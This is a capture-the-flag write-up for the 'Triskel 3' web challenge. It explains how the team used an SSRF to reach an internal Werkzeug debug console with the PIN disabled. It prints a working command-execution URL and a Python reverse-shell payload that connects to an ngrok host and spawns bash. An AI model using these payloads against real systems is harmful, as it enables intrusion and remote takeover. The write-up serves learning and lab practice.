# Triskel 3 : Dead end

## Web, 49 points

### Description

You are admin now... Anyway now you can't access any information or have more privileges so I guess it's the end of your journey haha!

by Remsio

### Solution

First thing we notice in the administration panel, after flagging Triskel 2, is the cookie entitled `confidential_documents` which contains, URL encoded `kontammadur_klanvour.prod.local:5001/documents`. We head back to our previously discovered SSRF to get more information with this link: http://10.44.128.134:8100/api/call_api.php?api=kontammadur_klanvour.prod.local. We got the associated IP address to this domain name with the response:
`Cant connect to API : 10.0.43.68`.

From this, we tried several things such as fetching `documents`, trying to inject another `documents` by replacing the targeted document with one we created on a server we manage, like if it was a REST API. These are some of our tries:
```bash
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.68:5001/documents
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.68:5001/documents/1
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.68:5001/documents/_
```

We tried server-side template injection with `tplmap` (_cf_. https://github.com/epinna/tplmap), without any success. We tried fuzzing with `Burp` as we thought it was a REST API:
```bash
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.68:5001/documents/{number}
```

This led us to a dead end too. Out of ideas, we even tried some NoSQLi: nothing again.

Finally, we got back to the administration panel and we noticed a green highlighted detail `API Powered by Werkzeug`. It is a Python WSGI web application library which is frequently used (_cf_. https://github.com/pallets/werkzeug). We were pretty sure the challenge was about that now. We directly tried to access `Werkzeug`'s console with this link: http://10.44.128.134:8100/api/call_api.php?api=10.0.43.68:5001/console. Still nothing.

We were hopeless and decided to launch a `dirb` on the IP address. We discovered then the `dev` machine at `10.0.43.74`. MAN! How did we not think about that before ? We could have found that more easily with the associated domain name `kontammadur_klanvour.dev.local` and this link to retrieve its IP address: http://10.44.128.134:8100/api/call_api.php?api=kontammadur_klanvour.dev.local.

We decided to try the same URLs we did for the production domain name then:
```bash
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/documents
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/documents/1
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/documents/2
http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/console
```

And results were quite different, we noticed notably that the application had the debugger mode enabled and in one document, someone deactivated the PIN to access the `Werkzeug` console: 
```
Are you kidding me? Who deactivated the PIN to access dev platform console??? ヽ(｀Д´)ノ      
```

From this, we documented ourselves a bit more with these resources https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug, https://github.com/its-arun/Werkzeug-Debug-RCE and some `Werkzeug` code at [https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py). We ended up with a Remote Command Execution (RCE), _e.g._ with this dummy link: [http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/console?__debugger__=yes%26cmd=ls%26frm=0%26s=RFM0zsH8cyFS5fS33t0d](http://10.44.128.134:8100/api/call_api.php?api=10.0.43.74:5001/console?__debugger__=yes%26cmd=ls%26frm=0%26s=RFM0zsH8cyFS5fS33t0d). At the time we were on this challenge, a team already solved the next step, hence we thought it would be better if we get a reverse shell directly to flag Triskel 3 and to be more comfortable for Triskel 4, that's what we did.

We struggled a lot to get this reverse shell as `Werkzeug` configuration made it impossible for us to execute multiple commands at the same time, thereby we couldn't get two reverse shells at a time. Which means that if a command is being processed by `Werkzeug` we can't do anything else with the application. For every wrong command we did, the server crashed and we had to ask the staff to reboot our machine, that was exhausting.

With some specific URL encoding with `CyberChef` and timeout handling to avoid getting stuck and asking for a reboot, we ended up with a reverse shell with this payload:
```python
import os; os.system("timeout 600 python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('2.tcp.ngrok.io',19194));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\"")
```

Then we flag:
```bash
root@kontammadur_klanvour:/app# cat /flag.txt
NORZH{FLASK_C0ns0l3_RCE_without_pin_seriously.._wait_did_I_land?}
```